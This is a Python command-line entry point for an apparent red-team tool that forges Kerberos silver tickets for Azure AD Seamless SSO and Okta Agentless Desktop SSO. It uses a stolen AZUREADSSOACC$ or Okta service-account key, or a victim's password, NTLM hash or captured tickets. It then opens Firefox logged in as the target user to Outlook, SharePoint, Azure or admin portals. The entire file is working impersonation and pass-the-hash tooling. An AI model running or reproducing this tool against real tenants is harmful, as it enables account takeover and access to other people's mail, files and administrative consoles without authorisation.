"""CLI entry point."""

import argparse
import errno
import os
import sys
import tempfile
import traceback

from seamless_sso_browser.errors import (
    EXIT_ENVIRONMENT,
    EXIT_INTERRUPTED,
    EXIT_OK,
    PATH_REASON_NO_SPACE,
    PATH_REASON_OTHER,
    PATH_REASON_PERMISSION,
    PATH_REASON_READ_ONLY,
    PATH_WHAT_FIREFOX_PROFILE,
    PATH_WHAT_KRB5_CONF,
    TICKET_REASON_DIRECTORY,
    TICKET_REASON_MISSING,
    TICKET_REASON_NO_CREDENTIALS,
    TICKET_REASON_UNREADABLE,
    KdcProtocolError,
    LocalEnvironmentError,
    SsoError,
    TicketError,
    flag_ignored_message,
    flag_requires_okta_idp_message,
    hex_format_message,
    interrupted_message,
    kdc_error_message,
    ntlm_hash_format_message,
    okta_org_not_derivable_message,
    sid_format_message,
    spn_mismatch_message,
    ticket_file_message,
    ticket_kind_message,
    unexpected_failure_message,
    unwritable_path_message,
)
from seamless_sso_browser.forger import AADG_SPN, AUTOLOGON_SPN, forge_tickets
from seamless_sso_browser.kerberos import (
    IMPACKET_KDC_ERRORS,
    ccache_from_tgs,
    kdc_protocol_error,
    load_ticket,
    parse_user_sid,
    tgs_from_credentials,
    tgs_from_tgt,
    ticket_service_principals,
)
from seamless_sso_browser.launcher import cleanup, find_firefox, launch_firefox
from seamless_sso_browser.profile import create_firefox_profile, create_krb5_conf

OKTA_BASE_DOMAINS = {
    "okta": "okta.com",
    "oktapreview": "oktapreview.com",
    "okta-emea": "okta-emea.com",
    "okta-gov": "okta-gov.com",
}


def _okta_base_domain(okta_domain: str) -> str:
    """Map an --okta-domain cell label to its full base domain."""
    return OKTA_BASE_DOMAINS[okta_domain]


def _derive_okta_spn(okta_org: str, okta_domain: str) -> str:
    """Derive the Okta Agentless DSSO SPN from org and domain.

    An empty org is a programming error, not user input: --okta-org is required in
    every non-exempt mode, and the two exempt modes derive the host from the imported
    ticket instead. The guard is what stops "HTTP/None.kerberos.okta.com" ever being
    formatted again.
    """
    if not okta_org:
        raise ValueError(
            "_derive_okta_spn needs an Okta org; derive the host from the ticket instead"
        )
    return f"HTTP/{okta_org}.kerberos.{_okta_base_domain(okta_domain)}"


TARGET_PRESETS = {
    "outlook": "https://outlook.office365.com",
    "sharepoint": "https://{tenant}.sharepoint.com",
    "teams": "https://teams.microsoft.com",
    "onedrive": "https://onedrive.live.com",
    "admin": "https://admin.microsoft.com",
    "entra": "https://entra.microsoft.com",
    "azure": "https://portal.azure.com",
}


def _resolve_target(
    parser: argparse.ArgumentParser, target: str, tenant: str | None,
    okta_org: str | None = None, okta_domain: str = "okta",
) -> str:
    """Resolve a target preset name or raw URL to a URL."""
    if target == "okta-dashboard":
        if not okta_org:
            parser.error("--target okta-dashboard requires --okta-org")
        return f"https://{okta_org}.{_okta_base_domain(okta_domain)}"

    if target.startswith("https://") or target.startswith("http://"):
        return target

    if target not in TARGET_PRESETS:
        all_presets = list(TARGET_PRESETS) + ["okta-dashboard"]
        parser.error(
            f"Unknown target '{target}'. Valid presets: {', '.join(all_presets)}. "
            "Or provide a full URL (https://...)."
        )

    url = TARGET_PRESETS[target]
    if "{tenant}" in url:
        if not tenant:
            parser.error(f"--target {target} requires --tenant")
        url = url.format(tenant=tenant)
    return url


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="seamless-sso-browser",
        description=(
            "Authenticate via Seamless SSO and launch Firefox as the target user."
        ),
    )

    parser.add_argument("--domain", required=True, help="AD domain (e.g. domain.local)")
    parser.add_argument("--user", help="Target sAMAccountName")
    parser.add_argument("--upn", help="Target UPN (e.g. jsmith@domain.com), for display")
    parser.add_argument("--dc-ip", help="Domain controller address")
    parser.add_argument("--user-sid", help="Full user SID (e.g. S-1-5-21-...-1234)")

    parser.add_argument(
        "--idp", choices=["azure", "okta"], default="azure",
        help="Target identity provider (default: azure)"
    )

    parser.add_argument(
        "--okta-org",
        help="Okta org subdomain (e.g. mycompany). Required when --idp okta."
    )
    parser.add_argument(
        "--okta-domain", choices=["okta", "oktapreview", "okta-emea", "okta-gov"],
        default="okta",
        help="Okta environment variant (default: okta)"
    )
    parser.add_argument(
        "--okta-svc-aes",
        help="AES key of the Okta DSSO service account (hex)"
    )

    forgery_group = parser.add_mutually_exclusive_group()
    forgery_group.add_argument("--adssoacc-ntlm", help="AZUREADSSOACC$ NTLM hash (hex)")
    forgery_group.add_argument("--adssoacc-aes", help="AZUREADSSOACC$ AES key (hex)")

    cred_group = parser.add_mutually_exclusive_group()
    cred_group.add_argument("--password", help="Target user's password")
    cred_group.add_argument(
        "--user-password-hash", help="Target user's NTLM hash ([LMHASH:]NTHASH)"
    )
    cred_group.add_argument("--user-aes-key", help="Target user's AES key (hex)")

    parser.add_argument("--tgt", help="Pre-obtained TGT (file path or base64)")
    parser.add_argument("--tgs", help="Pre-obtained TGS (file path or base64)")
    parser.add_argument("--ccache", help="Path to pre-forged ccache (skip all auth)")

    parser.add_argument(
        "--useragent", help="Custom user-agent string (default: Edge on Windows 11)"
    )
    parser.add_argument("--no-cleanup", action="store_true", help="Preserve temp artifacts")
    parser.add_argument("--firefox-path", help="Path to Firefox binary")
    parser.add_argument(
        "--target",
        default="outlook",
        help="Target app preset or URL (default: outlook). "
        f"Presets: {', '.join(list(TARGET_PRESETS) + ['okta-dashboard'])}",
    )
    parser.add_argument("--tenant", help="M365 tenant name (required for --target sharepoint)")
    parser.add_argument("--verbose", action="store_true", help="Print debug info")

    args = parser.parse_args(argv)

    args.target_url = _resolve_target(
        parser, args.target, args.tenant,
        okta_org=args.okta_org, okta_domain=args.okta_domain,
    )

    _validate_mode(parser, args)

    return args


_HEX_DIGITS = frozenset("0123456789abcdefABCDEF")

# Flag -> the hex string lengths it accepts. An NT hash is 16 bytes; an AES key is
# AES128 (16 bytes) or AES256 (32 bytes).
_HEX_FLAG_LENGTHS = {
    "--adssoacc-ntlm": (32,),
    "--adssoacc-aes": (32, 64),
    "--okta-svc-aes": (32, 64),
    "--user-aes-key": (32, 64),
}

# --user-password-hash is absent from the table above: it is a compound [LMHASH:]NTHASH
# value and is checked half by half against this length instead.
_NTLM_HALF_LENGTH = 32


def _flag_dest(flag: str) -> str:
    """Map a long option string to the argparse attribute it populates."""
    return flag.removeprefix("--").replace("-", "_")


def _is_hex(value: str) -> bool:
    """True when every character is a hex digit, case-insensitively."""
    return all(char in _HEX_DIGITS for char in value)


def _validate_credential_formats(
    parser: argparse.ArgumentParser, args: argparse.Namespace
) -> None:
    """Reject a present credential or key flag whose value is not hex of a valid length.

    Every message names the flag and the number of characters received, never the
    value: these flags carry key material and parser.error writes to a terminal.
    """
    for flag, lengths in _HEX_FLAG_LENGTHS.items():
        value = getattr(args, _flag_dest(flag))
        if value is None:
            continue
        if len(value) not in lengths or not _is_hex(value):
            parser.error(
                hex_format_message(flag, expected_lengths=lengths, got_length=len(value))
            )

    # split(":", 1) mirrors kerberos._parse_ntlm_hash: a value with no colon is one half,
    # and "a:b:c" leaves "b:c" as the second half, which is not hex and is rejected.
    if args.user_password_hash is not None:
        for half in args.user_password_hash.split(":", 1):
            if len(half) != _NTLM_HALF_LENGTH or not _is_hex(half):
                parser.error(
                    ntlm_hash_format_message("--user-password-hash", got_length=len(half))
                )


_SID_PREFIX = "S-1-5-21-"


def _is_well_formed_sid(sid: str) -> bool:
    """True exactly when kerberos.parse_user_sid would accept this SID.

    A deliberate mirror of parse_user_sid's own three steps rather than a call to it:
    the library keeps raising ValueError for anyone who reaches it directly, and
    argparse rejects the same values earlier and at exit 2. Validating earlier does
    not mean validating in one place only.
    """
    parts = sid.rsplit("-", 1)
    if len(parts) != 2:
        return False
    domain_sid, rid_str = parts
    if not domain_sid.startswith(_SID_PREFIX):
        return False
    try:
        int(rid_str)
    except ValueError:
        return False
    return True


def _validate_mode(parser: argparse.ArgumentParser, args: argparse.Namespace) -> None:
    # IDP cross-checks -- Okta flags require --idp okta
    if args.okta_svc_aes and args.idp != "okta":
        parser.error("--okta-svc-aes requires --idp okta")
    if args.okta_domain != "okta" and args.idp != "okta":
        parser.error("--okta-domain requires --idp okta")
    # The literal preset name only: a raw --target https://acme.okta.com is
    # _resolve_target's passthrough and not this check's business. Ahead of the
    # --okta-org check below because okta-dashboard is what *requires* --okta-org,
    # so naming the target names the root of the mismatch.
    if args.target == "okta-dashboard" and args.idp != "okta":
        parser.error(flag_requires_okta_idp_message("--target okta-dashboard"))
    if args.okta_org and args.idp != "okta":
        parser.error(flag_requires_okta_idp_message("--okta-org"))
    if args.idp == "okta" and (args.adssoacc_ntlm or args.adssoacc_aes):
        parser.error(
            "--adssoacc-ntlm and --adssoacc-aes are not valid with --idp okta. "
            "Use --okta-svc-aes for Okta forgery."
        )

    # --okta-org required for --idp okta except in ccache/tgs modes
    if args.idp == "okta" and not args.okta_org:
        has_tgs = args.tgs is not None
        has_ccache = args.ccache is not None
        if not (has_tgs or has_ccache):
            parser.error(
                "--okta-org is required when --idp okta "
                "(except in --tgs or --ccache mode)"
            )

    # Before the mode counting below, which reads an empty value as an absent flag and
    # would report "No auth mode specified" for a 0-character key.
    _validate_credential_formats(parser, args)

    # Checked whenever the flag is present, in every mode: the shape is wrong regardless
    # of whether this run would have used it. Before the mode counting for the same
    # reason the credential formats are -- an empty value must report its own shape.
    if args.user_sid is not None and not _is_well_formed_sid(args.user_sid):
        parser.error(sid_format_message(got=args.user_sid))

    has_forgery = args.adssoacc_ntlm or args.adssoacc_aes or args.okta_svc_aes
    has_creds = args.password or args.user_password_hash or args.user_aes_key
    has_tgt = args.tgt is not None
    has_tgs = args.tgs is not None
    has_ccache = args.ccache is not None

    modes = sum(bool(x) for x in [has_forgery, has_creds, has_tgt, has_tgs, has_ccache])
    if modes > 1:
        parser.error(
            "Conflicting auth modes. Use exactly one of: "
            "AZUREADSSOACC forgery (--adssoacc-ntlm/--adssoacc-aes), "
            "user credentials (--password/--user-password-hash/--user-aes-key), "
            "--tgt, --tgs, or --ccache."
        )
    if modes == 0:
        parser.error(
            "No auth mode specified. Provide one of: "
            "--adssoacc-ntlm, --adssoacc-aes, --password, "
            "--user-password-hash, --user-aes-key, --tgt, --tgs, or --ccache."
        )

    if has_ccache:
        return

    if has_tgs:
        return

    if has_tgt:
        missing = []
        if not args.dc_ip:
            missing.append("--dc-ip")
        if missing:
            parser.error(f"TGT mode requires: {', '.join(missing)}")
        return

    if has_creds:
        missing = []
        if not args.dc_ip:
            missing.append("--dc-ip")
        if not args.user:
            missing.append("--user")
        if missing:
            parser.error(f"Credential mode requires: {', '.join(missing)}")
        return

    if has_forgery:
        missing = []
        if not args.user_sid:
            missing.append("--user-sid")
        if not args.user:
            missing.append("--user")
        if missing:
            parser.error(f"Forgery mode requires: {', '.join(missing)}")
        return


_USER_SID_IGNORED_BECAUSE = (
    "in --ccache, --tgs, --tgt, and credential modes; it is only read when forging a ticket"
)


def _is_forgery_mode(args: argparse.Namespace) -> bool:
    """True when main()'s auth chain falls through to forging a ticket.

    A mirror of the five-mode if/elif in main(): --ccache, --tgs, --tgt and the
    three credential flags are each tested before the forgery branch is reached.
    """
    return not (
        args.ccache
        or args.tgs
        or args.tgt
        or args.password
        or args.user_password_hash
        or args.user_aes_key
    )


def _warn_ignored_flags(args: argparse.Namespace) -> None:
    """Warn on stderr about a flag that parsed fine and has no effect in this mode.

    Warnings go to stderr, never change the exit code, and say only that the flag
    is ignored -- --tenant without --target sharepoint and --user in any mode are
    deliberately silent, being redundant and used respectively.
    """
    if args.user_sid and not _is_forgery_mode(args):
        message = flag_ignored_message("--user-sid", because=_USER_SID_IGNORED_BECAUSE)
        print(f"Warning: {message}", file=sys.stderr)


def _validate_ccache_path(path: str) -> None:
    """Reject a --ccache value that is not a readable file, before any work begins.

    The bare assignment this guards is why a missing --ccache used to exit 0 with a
    full success narration and a Firefox launched against a KRB5CCNAME that does not
    exist -- after the tool had promised no password prompt would appear. --ccache is
    documented as a path, so a base64 value lands in the missing-file branch too.
    """
    if os.path.isdir(path):
        raise TicketError(
            ticket_file_message(path, reason=TICKET_REASON_DIRECTORY, flag="--ccache")
        )
    if not os.path.isfile(path):
        raise TicketError(
            ticket_file_message(path, reason=TICKET_REASON_MISSING, flag="--ccache")
        )
    if not os.access(path, os.R_OK):
        raise TicketError(
            ticket_file_message(path, reason=TICKET_REASON_UNREADABLE, flag="--ccache")
        )


def _ticket_spns(value: str, *, flag: str) -> list[str]:
    """Load a ticket and return its service principals, rejecting one that holds none.

    The shared read this stage's ticket policy is built on: load_ticket raises
    TicketError for a path or format problem, and a valid-header ccache with an empty
    credential list gets past it as a real input. Two of the three callers index into
    what comes back: --tgs and --tgt both classify the ticket through _ticket_is_a_tgt,
    whose spns[0] is the nearest IndexError on either path, and --tgt then hands the
    ticket to tgs_from_tgt, which reads credentials[0] to build its request to the DC.
    On those two the guard is what turns a bare IndexError into a rendered error.
    --ccache indexes nothing -- it passes the operator's path through untouched -- so
    there an empty ticket would instead be narrated as used and, on an Azure run,
    Firefox launched against a KRB5CCNAME holding nothing usable.
    """
    spns = ticket_service_principals(load_ticket(value))
    if not spns:
        raise TicketError(
            ticket_file_message(value, reason=TICKET_REASON_NO_CREDENTIALS, flag=flag)
        )
    return spns


# A Kerberos service principal's first component is the service class: krbtgt means a
# ticket-granting ticket, anything else (HTTP/...) means a service ticket.
_TGT_SERVICE_CLASS = "krbtgt"

# What ticket_kind_message renders as the kind that was required. Each names the flag
# that would have accepted the ticket the operator actually passed, because "wrong
# kind" on its own leaves them nowhere to go. The builder appends "is required", so the
# kind stays a bare noun phrase and the remedy goes in a parenthetical: a trailing
# clause instead reads as "...to have the DC issue one is required".
_SERVICE_TICKET_EXPECTED = (
    "a service ticket (pass a TGT with --tgt and --dc-ip to have the DC issue one)"
)
_TGT_EXPECTED = "a TGT (pass a service ticket with --tgs to import it directly)"


def _ticket_is_a_tgt(spns: list[str]) -> bool:
    """True when the ticket's first credential is a ticket-granting ticket.

    Reads the service class only, and case-insensitively: a realm is conventionally
    upper case and the service class is not, but neither is guaranteed. A principal
    with no "/" at all yields the whole string, which is not krbtgt, so such a ticket
    is classified as a service ticket -- split("/", 1)[0] always returns a component,
    where reading the instance half instead would raise IndexError in the middle of the
    error handling this check exists to feed.

    _ticket_spns guarantees a non-empty list, so spns[0] needs no emptiness check here.
    """
    return spns[0].split("/", 1)[0].lower() == _TGT_SERVICE_CLASS


def _expected_sso_spns(args: argparse.Namespace) -> tuple[str, ...]:
    """The SPN(s) an imported ticket must carry for this target's SSO to fire.

    Azure needs one of the two SSO SPNs; Okta needs the one built from --okta-org.
    Under --idp okta with no --okta-org the Okta host is not known here -- --ccache and
    --tgs are exempt from requiring it, and a later requirement derives it from the
    ticket -- so there is no expected set and the caller stays silent rather than
    warning against a host it guessed.
    """
    if args.idp == "okta":
        if not args.okta_org:
            return ()
        return (_derive_okta_spn(args.okta_org, args.okta_domain),)
    return (AUTOLOGON_SPN, AADG_SPN)


def _warn_on_spn_mismatch(spns: list[str], args: argparse.Namespace) -> None:
    """Warn on stderr when no credential in an imported ticket carries an expected SPN.

    A warning and not an error, per decision (f): the expected set is IdP- and
    org-dependent, and an operator may hold a ccache with several credentials of which
    one is right. At least one match is silent; a false positive here would block a
    working invocation. Warnings go to stderr and never change the exit code.

    Each entry of spns keeps the realm suffix the ticket holds, so matching against a
    bare SPN splits at "@" first; the message names what was found with the realm still
    on it, because that is what the operator has to recognise.
    """
    expected = _expected_sso_spns(args)
    if not expected:
        return
    found = tuple(spns)
    if any(spn.split("@", 1)[0] in expected for spn in found):
        return
    message = spn_mismatch_message(found, expected=" or ".join(expected))
    print(f"Warning: {message}", file=sys.stderr)


_OKTA_HOST_INFIX = ".kerberos."


def _okta_host_from_spn(spn: str) -> str | None:
    """The Okta Agentless DSSO host one SPN carries, or None when it is not one.

    An Okta DSSO SPN is HTTP/<org>.kerberos.<base-domain>, where <base-domain> is one
    of OKTA_BASE_DOMAINS' values. ticket_service_principals keeps the realm suffix, so
    that is dropped first. The host is read out of the ticket rather than rebuilt from
    --okta-domain: the ticket is the authority on which Okta cell issued it.
    """
    service, _, host = spn.split("@", 1)[0].partition("/")
    if service.upper() != "HTTP" or not host:
        return None
    org, infix, base_domain = host.partition(_OKTA_HOST_INFIX)
    if not infix or not org or base_domain not in set(OKTA_BASE_DOMAINS.values()):
        return None
    return host


def _okta_hosts_from_ticket(
    spns: list[str], args: argparse.Namespace, *, path: str
) -> tuple[str, list[str]] | None:
    """The trusted_uris and sso_hosts an imported ticket implies, or None to leave them.

    None means "change nothing": either this is not an Okta run, or --okta-org was
    given and won, in which case main() computed both from the flag already. --ccache
    and --tgs are exempt from requiring --okta-org precisely because the host is
    readable here; a ticket that carries no Okta DSSO SPN has nothing to read, and
    guessing one would write a dead host into user.js and krb5.conf.
    """
    if args.idp != "okta" or args.okta_org:
        return None
    for spn in spns:
        host = _okta_host_from_spn(spn)
        if host is not None:
            return f"https://{host}", [host]
    raise TicketError(okta_org_not_derivable_message(path, found_spns=tuple(spns)))


# Both the typed failure kerberos.py raises and impacket's own, so a KerberosError that
# reaches this boundary untranslated -- from a seam a test patched, or from an impacket
# call inside the auth functions that is not one of the two wrapped ones -- still renders
# in the right register instead of falling to main()'s catch-all as exit 1.
_KDC_ERRORS_TO_RENDER = (KdcProtocolError, *IMPACKET_KDC_ERRORS)

# Printed before every KDC round trip. An unreachable DC takes about a minute to fail,
# and a silent wait that long reads as a hang -- so the wait is announced. No timeout is
# imposed and the CLI exposes no flag to set one.
_KDC_WAIT_NOTICE = "[*] Contacting the DC; this can take up to a minute if it is unreachable."


def _rendered_kdc_error(
    exc: BaseException, args: argparse.Namespace, *, okta_spn: str | None
) -> KdcProtocolError:
    """Rebuild a KDC protocol failure with the message this run's --idp calls for.

    kerberos.py resolves the code and the code name because it holds the impacket
    coupling; the register is chosen here because this is the only module that knows
    --idp. code and code_name are carried across so nothing the translation learned is
    lost, and the caller chains with "from exc" so --verbose still shows impacket's own
    traceback.
    """
    protocol = exc if isinstance(exc, KdcProtocolError) else kdc_protocol_error(exc)
    return KdcProtocolError(
        kdc_error_message(
            protocol.code,
            args.idp,
            code_name=protocol.code_name,
            detail=str(protocol),
            okta_spn=okta_spn,
        ),
        code=protocol.code,
        code_name=protocol.code_name,
    )


# Which reason a failed profile or krb5.conf write renders, by errno. The errno is read
# and err.strerror is never interpolated: no OS-provided text reaches a user-facing
# message in this project, which is why every reason is one of four constants and why
# the lookup below has a default that cannot raise.
_UNWRITABLE_REASONS_BY_ERRNO = {
    errno.EACCES: PATH_REASON_PERMISSION,
    errno.EPERM: PATH_REASON_PERMISSION,
    errno.EROFS: PATH_REASON_READ_ONLY,
    errno.ENOSPC: PATH_REASON_NO_SPACE,
}


def _unwritable_reason(err: OSError) -> str:
    """Map an OSError from a profile or krb5.conf write to the reason it renders."""
    return _UNWRITABLE_REASONS_BY_ERRNO.get(err.errno, PATH_REASON_OTHER)


def main() -> None:
    args = parse_args(sys.argv[1:])

    temp_dir: str | None = None
    ccache_path: str | None = None
    ccache_is_ours = False

    error_message: str | None = None
    exit_code = EXIT_OK
    failure: BaseException | None = None

    try:
        _warn_ignored_flags(args)
        firefox_path = find_firefox(args.firefox_path)

        if args.idp == "okta" and args.okta_org:
            okta_spn = _derive_okta_spn(args.okta_org, args.okta_domain)
            okta_host = okta_spn.split("/", 1)[1]
            spn_list = [okta_spn]
            trusted_uris = f"https://{okta_host}"
            sso_hosts = [okta_host]  # domain_realm mapping for krb5.conf
        else:
            spn_list = None
            trusted_uris = None
            sso_hosts = None

        temp_dir = tempfile.mkdtemp(prefix="sso-")

        display_name = args.upn or args.user or "target"

        if args.ccache:
            _validate_ccache_path(args.ccache)
            spns = _ticket_spns(args.ccache, flag="--ccache")
            _warn_on_spn_mismatch(spns, args)
            derived = _okta_hosts_from_ticket(spns, args, path=args.ccache)
            if derived is not None:
                trusted_uris, sso_hosts = derived
            print(f"[*] Using pre-forged ccache: {args.ccache}")
            ccache_path = args.ccache
        elif args.tgs:
            spns = _ticket_spns(args.tgs, flag="--tgs")
            if _ticket_is_a_tgt(spns):
                raise TicketError(
                    ticket_kind_message(spns[0], expected=_SERVICE_TICKET_EXPECTED)
                )
            _warn_on_spn_mismatch(spns, args)
            derived = _okta_hosts_from_ticket(spns, args, path=args.tgs)
            if derived is not None:
                trusted_uris, sso_hosts = derived
            print(f"[*] Importing TGS from: {args.tgs}")
            ccache_path = ccache_from_tgs(args.tgs, temp_dir)
            ccache_is_ours = True
            print("[+] TGS imported successfully")
        elif args.tgt:
            spns = _ticket_spns(args.tgt, flag="--tgt")
            if not _ticket_is_a_tgt(spns):
                raise TicketError(ticket_kind_message(spns[0], expected=_TGT_EXPECTED))
            print(f"[*] Importing TGT from: {args.tgt}")
            if args.idp == "okta":
                print(f"[*] Requesting TGS from DC {args.dc_ip} for Okta SSO SPN")
            else:
                print(f"[*] Requesting TGS from DC {args.dc_ip} for SSO SPNs")
            print(_KDC_WAIT_NOTICE)
            try:
                ccache_path = tgs_from_tgt(
                    args.tgt, args.domain, args.dc_ip, temp_dir, spns=spn_list,
                )
            except _KDC_ERRORS_TO_RENDER as exc:
                raise _rendered_kdc_error(
                    exc, args, okta_spn=spn_list[0] if spn_list else None
                ) from exc
            ccache_is_ours = True
            if args.idp == "okta":
                print("[+] TGS ticket obtained for Okta SSO SPN")
            else:
                print("[+] TGS tickets obtained for both SSO SPNs")
        elif args.password or args.user_password_hash or args.user_aes_key:
            cred_type = (
                "password" if args.password
                else "NTLM hash" if args.user_password_hash
                else "AES key"
            )
            print(f"[*] Authenticating as {display_name} using {cred_type}")
            print(f"[*] Requesting TGT from DC {args.dc_ip}")
            print(_KDC_WAIT_NOTICE)
            try:
                ccache_path = tgs_from_credentials(
                    domain=args.domain,
                    dc_ip=args.dc_ip,
                    username=args.user,
                    work_dir=temp_dir,
                    password=args.password,
                    nthash=args.user_password_hash,
                    aes_key=args.user_aes_key,
                    spns=spn_list,
                )
            except _KDC_ERRORS_TO_RENDER as exc:
                raise _rendered_kdc_error(
                    exc, args, okta_spn=spn_list[0] if spn_list else None
                ) from exc
            ccache_is_ours = True
            print("[+] TGT obtained")
            if args.idp == "okta":
                print("[+] TGS ticket obtained for Okta SSO SPN")
            else:
                print("[+] TGS tickets obtained for both SSO SPNs")
        else:
            domain_sid, user_rid = parse_user_sid(args.user_sid)
            if args.idp == "okta":
                forge_aes = args.okta_svc_aes
                forge_ntlm = None
                print("[*] Forging silver ticket using Okta DSSO service account AES key")
            else:
                forge_aes = args.adssoacc_aes
                forge_ntlm = args.adssoacc_ntlm
                key_type = "NTLM hash" if args.adssoacc_ntlm else "AES key"
                print(f"[*] Forging silver tickets using AZUREADSSOACC$ {key_type}")
            print(f"[*] Target user: {display_name} (RID {user_rid})")
            ccache_path = forge_tickets(
                domain=args.domain,
                domain_sid=domain_sid,
                user=args.user,
                user_rid=user_rid,
                work_dir=temp_dir,
                adssoacc_ntlm=forge_ntlm,
                adssoacc_aes=forge_aes,
                spns=spn_list,
            )
            ccache_is_ours = True
            if args.idp == "okta":
                print(f"[+] Forged TGS for {okta_spn}")
            else:
                print("[+] Forged TGS for HTTP/autologon.microsoftazuread-sso.com")
                print("[+] Forged TGS for HTTP/aadg.windows.net.nsatc.net")
                print("[+] Tickets merged into combined ccache")

        if args.idp == "okta":
            print("[*] Configuring Firefox profile for Okta Agentless Desktop SSO")
        else:
            print("[*] Configuring Firefox profile for Seamless SSO")
        # KdcUnreachableError is an OSError, so a wider "except OSError" here would catch
        # the very type this stage raises elsewhere; each try below holds a single call
        # into profile.py, which imports nothing from errors and so can raise no SsoError.
        # The message names temp_dir rather than err.filename, because an OSError raised
        # without a filename would put None on the path the operator is told to act on.
        try:
            profile_dir = create_firefox_profile(
                temp_dir=temp_dir,
                useragent=args.useragent,
                trusted_uris=trusted_uris,
            )
        except OSError as err:
            raise LocalEnvironmentError(
                unwritable_path_message(
                    temp_dir,
                    what=PATH_WHAT_FIREFOX_PROFILE,
                    reason=_unwritable_reason(err),
                )
            ) from err

        try:
            krb5_conf_path = create_krb5_conf(
                temp_dir=temp_dir, domain=args.domain, sso_hosts=sso_hosts
            )
        except OSError as err:
            raise LocalEnvironmentError(
                unwritable_path_message(
                    temp_dir,
                    what=PATH_WHAT_KRB5_CONF,
                    reason=_unwritable_reason(err),
                )
            ) from err
        print(f"[*] Kerberos realm: {args.domain.upper()}")

        print()
        print(f"[*] Launching Firefox as {display_name}")
        print(f"[*] Target: {args.target_url}")
        print()
        if args.idp == "okta":
            print("[*] Okta dashboard launched")
        else:
            print("[*] When the login page appears, enter the user's email and press Enter.")
            print("[*] Seamless SSO will handle the rest — no password prompt should appear.")
        print()
        print("[*] Close Firefox to clean up. Ctrl+C to abort.")

        launch_firefox(
            firefox_path=firefox_path,
            profile_dir=profile_dir,
            ccache_path=ccache_path,
            krb5_conf_path=krb5_conf_path,
            target_url=args.target_url,
            verbose=args.verbose,
            idp=args.idp,
        )
    except KeyboardInterrupt as exc:
        error_message = interrupted_message()
        exit_code = EXIT_INTERRUPTED
        failure = exc
    except SsoError as exc:
        error_message = str(exc)
        exit_code = exc.exit_code
        failure = exc
    except Exception as exc:
        error_message = unexpected_failure_message(exc)
        exit_code = EXIT_ENVIRONMENT
        failure = exc
    finally:
        # temp_dir is still None when the run failed before mkdtemp created anything:
        # there is nothing to clean and nothing truthful to narrate.
        if temp_dir is not None:
            if args.no_cleanup:
                print(f"[*] Artifacts preserved at: {temp_dir}")
                if ccache_is_ours:
                    print(f"[*] Ccache: {ccache_path}")
            else:
                cleanup(temp_dir, ccache_path if ccache_is_ours else None)
                print("[*] Cleaned up.")

    if error_message is not None:
        print(f"Error: {error_message}", file=sys.stderr)
        if args.verbose and failure is not None:
            traceback.print_exception(failure, file=sys.stderr)
        sys.exit(exit_code)
